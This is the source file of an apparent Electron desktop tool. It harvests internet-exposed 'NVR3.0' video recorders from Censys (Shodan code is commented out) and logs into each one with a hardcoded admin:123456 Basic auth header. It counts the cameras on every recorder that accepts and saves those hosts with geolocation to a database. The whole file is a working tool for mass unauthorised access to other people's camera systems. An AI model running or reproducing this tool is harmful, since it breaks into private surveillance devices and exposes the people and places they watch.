import { ipcMain, BrowserWindow } from 'electron';
import { Database } from '../utils/Database';
require('dotenv').config();

type ShodanSingleItem = {
  ip_str: string,
  port: number,
}

type CensysSingleItem = {
  ip: string,
  services: {
    port: number,
    service_name: string
  }[],
  location: {
    coordinates: {
      longitude: string,
      latitude: string
    },
    city: string,
    country: string,
    country_code: string,
  },
}


type CameraRecord = {
  ip: string,
  port: string,
  lat: string,
  long: string,
  city: string,
  country: string,
  country_code: string,
  count?: number,
}

export class Generate {

  private win: BrowserWindow;
  private shodanApiKey: string = process.env.SHODAN_API_KEY ?? "";
  private censysAppId: string = process.env.CENSYS_APP_ID ?? "";
  private censysSecret: string = process.env.CENSYS_SECRET ?? "";

  private successCount: number = 0;
  private failedCount: number = 0;
  private errorCount: number = 0;

  private active: boolean = false;

  constructor(win: BrowserWindow) {
    this.setupListner();
    this.win = win;
  }



  private setupListner() {
    ipcMain.on('generate:start', () => { this.handleGenerateStart() });
  }

  private saveToDatabase(data: CameraRecord) {
    const dbName = Database.dbName;
    Database.db.get(`SELECT ip FROM ${dbName} WHERE ip = ? and port = ?`, [data.ip, data.port], (err, row) => {
      if (err || row)
        return;

      console.log(`INSERTING ${data.ip}:${data.port}`)
      const stmt = Database.prepare("INSERT INTO {DATABASE} VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
      stmt.run(
        data.ip,
        data.port,
        data.lat,
        data.long,
        data.city,
        data.country,
        data.country_code,
        data.count
      )

    })
  }


  private timeoutFetch(ms: number, promise: Promise<Response>): Promise<Response> {
    return new Promise((resolve, reject) => {
      const timer = setTimeout(() => {
        reject(new Error('TIMEOUT'))
      }, ms)

      promise
        .then(value => {
          clearTimeout(timer)
          resolve(value)
        })
        .catch(reason => {
          clearTimeout(timer)
          reject(reason)
        })
    })
  }

  private sendIpToRenderer(ip: string) {
    this.win.webContents.send("generate:message", JSON.stringify({
      message: ip,
      success: this.successCount,
      failed: this.failedCount,
      error: this.errorCount,
    })
    )
  }


  private async getCameraCount(server: string): Promise<number> {
    console.log("GETTING CAMERA COUNT ", server)
    try {
      const response = await this.timeoutFetch(10000, fetch(`http://${server}/Media/Device/getDevice?response_format=json`, {
        headers: {
          "Authorization": "Basic YWRtaW46MTIzNDU2"
        }
      }))

      if (response.status == 200 && response.statusText == "OK") {
        try {
          const text = await response.text();
          const json = JSON.parse(text);
          return json["DeviceConfig"]["Devices"]["Device"].length;
        } catch {
          return 0;
        }
      }
    }
    catch { }
    return 0;
  }


  private async testServers(list: CameraRecord[]) {
    console.log(`TESTING ${list.length} SERVERS`)
    let promises = list.map(item => this.timeoutFetch(10000, fetch(`http://${item.ip}:${item.port}/Media/UserGroup/login?response_format=json`, {
      headers: {
        "Authorization": "Basic YWRtaW46MTIzNDU2"
      }
    }))

      .then(async (resp: Response) => {
        if (resp.status == 200) {
          this.successCount += 1;
          const cameraCount = await this.getCameraCount(`${item.ip}:${item.port}`)
          item.count = cameraCount;

          this.sendIpToRenderer(`${item.ip}:${item.port}`);
          this.saveToDatabase(item);

        }
        else
          this.failedCount += 1;
      })
      .catch(() => { this.errorCount += 1; })
    )
    return Promise.all(promises);
  }


  /*
    private async searchShodan(page: number = 0) {
      const url = "https://api.shodan.io/shodan/host/search";
      const query = "http.html:NVR3.0";
      const res = await fetch(`${url}?key=${this.shodanApiKey}&query=${query}&page=${page}`);
      const json = await res.json();
      const ipList = json["matches"].map((data: ShodanSingleItem) => `${data.ip_str}:${data.port}`);
      await this.testServers(ipList)
  
      page++;
      if ((page * 100) < json["total"])
        this.searchShodan(page);
    }
    */



  private async searchCensys(key: string = "", cursor: string = "") {
    console.log(`CURSOR: ${cursor}`)
    if (!key)
      key = Buffer.from(`${this.censysAppId}:${this.censysSecret}`).toString("base64");

    const url = "https://search.censys.io/api/v2/hosts/search";
    const query = "services.http.response.body:NVR3.0"
    const perPage = 100;

    let reqString = `${url}?q=${query}&per_page=${perPage}`;
    if (cursor)
      reqString += `&cursor=${cursor}`;

    const res = await fetch(reqString, {
      headers: {
        "Authorization": `Basic ${key}`
      }
    })

    const json = await res.json();
    let ipList = new Set<CameraRecord>()

    json["result"]["hits"].forEach((item: CensysSingleItem) => {
      item.services.forEach((service) => {
        if (service.service_name == "HTTP") {
          const port: string = service.port.toString();
          const record: CameraRecord = {
            ip: item.ip,
            port: port,
            lat: item.location.coordinates.latitude,
            long: item.location.coordinates.longitude,
            city: item.location.city,
            country: item.location.country,
            country_code: item.location.country_code,
          }
          ipList.add(record);
        }
      })
    })

    const arrs = [];
    const ipArr = Array.from(ipList);

    while (ipArr.length > 0)
      arrs.push(ipArr.splice(0, 50))

    for (const arr of arrs) {
      await this.testServers(arr)
    }

    const nextCursor = json["result"]["links"]["next"]
    if (nextCursor)
      await this.searchCensys(key, nextCursor);

  }

  private async handleGenerateStart() {
    if (this.active)
      return;
    this.successCount = 0;
    this.errorCount = 0;
    this.failedCount = 0;
    this.active = true;
    console.log("loading shodan results");
    //await this.searchShodan();

    console.log("loading censys results");
    await this.searchCensys()

    this.active = false;



    console.log(this.successCount, this.failedCount, this.errorCount);
  }
}

